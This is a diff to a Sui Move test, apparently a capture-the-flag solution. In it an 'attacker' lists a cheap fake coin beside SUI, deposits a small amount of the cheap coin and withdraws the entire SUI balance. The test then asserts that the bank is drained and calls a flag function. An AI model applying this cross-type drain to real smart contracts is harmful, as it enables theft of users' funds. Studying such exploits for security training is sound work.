@@ -14,15 +14,16 @@ fun cross_type_drain() {
     let mut sc = ts::begin(attacker);
 
     let mut bank = bank::create(ts::ctx(&mut sc));
-    bank::fund<SUI>(&mut bank, coin::mint_for_testing<SUI>(1_000_000, ts::ctx(&mut sc)));
+    bank::list<SUI>(&mut bank, 1000, coin::mint_for_testing<SUI>(1_000_000, ts::ctx(&mut sc)));
+    bank::list<CHEAP>(&mut bank, 1, coin::mint_for_testing<CHEAP>(1, ts::ctx(&mut sc)));
 
-    let voucher = bank::deposit<CHEAP>(
+    let ticket = bank::deposit<CHEAP>(
         &mut bank,
-        coin::mint_for_testing<CHEAP>(1_000_000, ts::ctx(&mut sc)),
+        coin::mint_for_testing<CHEAP>(1000, ts::ctx(&mut sc)),
         ts::ctx(&mut sc),
     );
+    let loot = bank::withdraw<SUI>(&mut bank, ticket, ts::ctx(&mut sc));
 
-    let loot = bank::withdraw<SUI>(&mut bank, voucher, ts::ctx(&mut sc));
     assert!(coin::value(&loot) == 1_000_000, 0);
     assert!(bank::balance_of<SUI>(&bank) == 0, 1);
     bank::flag<SUI>(&bank);
